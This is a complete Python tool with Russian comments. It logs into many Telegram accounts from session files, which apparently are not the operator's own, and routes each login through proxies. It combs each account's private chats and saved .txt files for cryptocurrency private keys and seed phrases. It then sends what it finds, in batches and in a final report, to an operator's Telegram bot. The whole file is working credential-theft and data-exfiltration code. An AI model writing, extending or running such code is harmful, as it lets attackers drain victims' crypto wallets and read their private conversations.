import os
import re
import json
import asyncio
import requests
from datetime import datetime
from random import choice
from pyrogram import Client, enums

from utils.states import Stats
from utils.time_utils import random_delay
from utils.tg_funcs import send_message_to_telegram
from utils.files_utils import write_to_file, parse_proxy
from utils.basic import get_bip39_words, get_usernames, get_proxies
from utils.patterns import HASH_PATTERN, BITCOIN_PATTERN, SOLANA_PATTERN, TRON_PATTERN

from config import (
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
    SESSIONS_FOLDER,
    LOGS_DIR,
    DOWNLOADS_DIR,
)


current_time = datetime.now().strftime("%d.%m.%Y_%H.%M")
OUTPUT_FILE = f"{LOGS_DIR}/output_{current_time}.txt"
stats = Stats()


async def download_txt_files_from_saved_messages(app, session_name):
    try:
        saved_messages_chat = await app.get_chat("me")

        async for message in app.get_chat_history(saved_messages_chat.id):
            if message.document and message.document.file_name.endswith(".txt"):
                file_path = f"{DOWNLOADS_DIR}/{message.document.file_name}"
                await app.download_media(message, file_path)
                print(f"Скачан файл: {file_path}")
                await check_file_contents(file_path, session_name)
                await random_delay()
    except Exception as e:
        print(f"Ошибка при скачивании файлов из сохраненных сообщений: {e}")


async def check_contacts(app, session_name):
    try:
        USERNAMES = get_usernames()
        dialogs = []

        async for dialog in app.get_dialogs():
            if dialog.chat.username:
                dialogs.append(dialog.chat.username)

        for username in USERNAMES:
            if username.lstrip("@") in dialogs:
                write_to_file(
                    OUTPUT_FILE, f"Сессия {session_name}: найден диалог с {username}"
                )
            await random_delay()
    except Exception as e:
        print(f"Ошибка при проверке контактов: {e}")


def is_valid_mnemonic(text):
    try:
        BIP39_WORDS = get_bip39_words()
        cleaned_text = re.sub(r"[^\w\s]", " ", text)
        words = cleaned_text.strip().split()

        return len(words) in (12, 18, 24) and all(word in BIP39_WORDS for word in words)
    except Exception as e:
        print(f"Ошибка при проверке сид-фразы: {e}")
        return False


def find_keys(text):
    try:
        keys = {
            "bitcoin": BITCOIN_PATTERN.findall(text),
            "solana": SOLANA_PATTERN.findall(text),
            "tron": TRON_PATTERN.findall(text),
            "ethereum": HASH_PATTERN.findall(text),
        }

        return {key: matches for key, matches in keys.items() if matches}
    except Exception as e:
        print(f"Ошибка при поиске ключей: {e}")
        return {}


def update_invalid_sessions_stats(session_name, error_type):
    stats_file = f"{LOGS_DIR}/invalid_sessions_stats.json"
    try:
        if os.path.exists(stats_file):
            with open(stats_file, "r") as f:
                stats = json.load(f)
        else:
            stats = {"total_invalid": 0, "sessions": {}}

        stats["total_invalid"] += 1
        stats["sessions"][session_name] = {
            "error_type": error_type,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

        with open(stats_file, "w") as f:
            json.dump(stats, f, indent=4)
    except Exception as e:
        print(f"Ошибка при обновлении статистики: {e}")


async def check_text(text, session_name):
    if not text:
        return
    try:
        key_matches = find_keys(text)
        if key_matches:
            write_to_file(OUTPUT_FILE, f"Сессия: {session_name}")
            for key_type, matches in key_matches.items():
                for match in matches:
                    if key_type in ["ethereum", "bitcoin", "solana", "tron"]:
                        marked_key = f"[{key_type.upper()}] {match}"
                        stats.private_keys.append(marked_key)
                        stats.total_privkeys += 1
                        stats.combined_findings += 1
                    write_to_file(OUTPUT_FILE, f"Найден {key_type} ключ: {match}")
            write_to_file(OUTPUT_FILE, "")

        if is_valid_mnemonic(text):
            write_to_file(OUTPUT_FILE, f"Сессия: {session_name}")
            stats.seed_phrases.append(f"[SEED] {text}")
            stats.total_seeds += 1
            stats.combined_findings += 1
            write_to_file(OUTPUT_FILE, f"Найдена сид фраза: {text}")
            write_to_file(OUTPUT_FILE, "")

        if stats.combined_findings >= 10:
            message = []
            if stats.private_keys:
                message.append(
                    "Найдены приватные ключи:\n" + "\n".join(stats.private_keys)
                )
            if stats.seed_phrases:
                message.append("Найдены сид-фразы:\n" + "\n".join(stats.seed_phrases))

            if message:
                send_message_to_telegram("\n\n".join(message))
                stats.private_keys = []
                stats.seed_phrases = []
                stats.combined_findings = 0
    except Exception as e:
        print(f"Ошибка при проверке текста: {e}")


async def check_file_contents(file_path, session_name):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                await check_text(line.strip(), session_name)
    except Exception as e:
        print(f"Ошибка при чтении файла {file_path}: {e}")


async def check_message(message, session_name):
    try:
        if message.text:
            await check_text(message.text, session_name)
            await random_delay()

        if message.photo and message.caption:
            await check_text(message.caption, session_name)
            await random_delay()
    except Exception as e:
        print(f"Ошибка при проверке сообщения: {e}")


async def process_session(session_path, session_name):
    PROXIES = get_proxies()
    json_path = f"{session_path}.json"
    if not os.path.exists(json_path):
        print(f"Пропуск сессии {session_name}: файл конфигурации не найден")
        return

    try:
        with open(json_path, "r", encoding="utf-8") as f:
            session_data = json.load(f)
            api_id = session_data.get("app_id")
            api_hash = session_data.get("app_hash")
    except Exception as e:
        print(f"Пропуск сессии {session_name}: ошибка чтения конфигурации - {e}")
        return

    if not api_id or not api_hash:
        print(f"Пропуск сессии {session_name}: отсутствуют api_id или api_hash")
        return

    # пробуем найти рабочий прокси
    proxy = None
    max_proxy_attempts = 3
    proxy_attempts = 0

    while proxy_attempts < max_proxy_attempts:
        try:
            proxy = parse_proxy(choice(PROXIES))
            if not proxy:
                print(f"Пропуск прокси: неверный формат")
                proxy_attempts += 1
                continue

            print(
                f"Сессия {session_name} использует прокси: {proxy['hostname']}:{proxy['port']}"
            )

            try:
                async with Client(session_path, api_id, api_hash, proxy=proxy) as app:
                    print(
                        f"Сессия {session_name} использует прокси: {proxy['hostname']}:{proxy['port']}"
                    )
                    await download_txt_files_from_saved_messages(app, session_name)
                    print(f"Сессия {session_name} успешно скачала файл")
                    await random_delay()

                    await check_contacts(app, session_name)
                    await random_delay()

                    async for dialog in app.get_dialogs():
                        if dialog.chat.type == enums.ChatType.PRIVATE:
                            try:
                                print(
                                    f"Сессия {session_name} проверяет личный диалог с {dialog.chat.id}"
                                )
                                try:
                                    async for message in app.get_chat_history(
                                        dialog.chat.id
                                    ):
                                        await check_message(message, session_name)
                                        await random_delay()
                                except:
                                    pass
                            except Exception as chat_error:
                                # print(
                                #     f"Ошибка при обработке диалога {dialog.chat.id}: {chat_error}"
                                # )
                                continue

                stats.processed_sessions += 1
                break

            except Exception as e:
                error_message = str(e)
                invalid_session_errors = {
                    "SESSION_REVOKED": "session_revoked",
                    "AUTH_KEY_UNREGISTERED": "auth_key_unregistered",
                    "USER_DEACTIVATED_BAN": "user_deactivated",
                    "AUTH_KEY_DUPLICATED": "auth_key_duplicated",
                    "CHANNEL_PRIVATE": "channel_private",
                }

                for error_text, error_type in invalid_session_errors.items():
                    if error_text in error_message:
                        if error_text == "CHANNEL_PRIVATE":
                            return

                        print(
                            f"Пропуск сессии {session_name}: Аккаунт невалид. Причина: {error_text}"
                        )
                        update_invalid_sessions_stats(session_name, error_type)
                        stats.invalid_sessions += 1
                        return

                print(f"Ошибка при обработке сессии {session_name}: {e}")
                proxy_attempts += 1
                continue

        except Exception as e:
            print(f"Прокси не работает, пробуем следующий: {e}")
            proxy_attempts += 1
            await asyncio.sleep(1)

    if proxy_attempts >= max_proxy_attempts:
        print(
            f"Пропуск сессии {session_name}: не удалось найти рабочий прокси после {max_proxy_attempts} попыток"
        )
        return


async def main():
    if not os.path.exists(SESSIONS_FOLDER):
        return

    session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith(".session")]
    stats.total_sessions = len(session_files)
    tasks = []
    for session_file in session_files:
        session_name = session_file.split(".")[0]
        session_path = f"{SESSIONS_FOLDER}/{session_name}"
        tasks.append(asyncio.create_task(process_session(session_path, session_name)))

    await asyncio.gather(*tasks)

    current_time = datetime.now().strftime("%d.%m.%Y_%H.%M")
    report_file = f"{LOGS_DIR}/final_report_{current_time}.txt"

    with open(report_file, "w", encoding="utf-8") as f:
        f.write("=== ИТОГОВЫЙ ОТЧЕТ ===\n\n")

        if stats.private_keys:
            f.write("ПРИВАТНЫЕ КЛЮЧИ:\n")
            f.write("\n".join(stats.private_keys))
            f.write("\n\n")

        if stats.seed_phrases:
            f.write("СИД-ФРАЗЫ:\n")
            f.write("\n".join(stats.seed_phrases))
            f.write("\n\n")

        f.write(
            f"""СТАТИСТИКА:
✅ Обработано сессий: {stats.processed_sessions}
❌ Невалидных сессий: {stats.invalid_sessions}
🔑 Найдено приватных ключей: {stats.total_privkeys}
🌱 Найдено сид-фраз: {stats.total_seeds}
"""
        )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(report_file, "rb") as f:
        files = {"document": (f"report_{current_time}.txt", f, "text/plain")}
        data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📊 Итоговый отчет о проверке"}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Ошибка отправки отчета: {response.text}")

    final_stats = f"""
📊 Итоговая статистика:
✅ Обработано сессий: {stats.processed_sessions}
❌ Невалидных сессий: {stats.invalid_sessions}
🔑 Найдено приватных ключей: {stats.total_privkeys}
🌱 Найдено сид-фраз: {stats.total_seeds}
    """
    send_message_to_telegram(final_stats)


if __name__ == "__main__":
    asyncio.run(main())
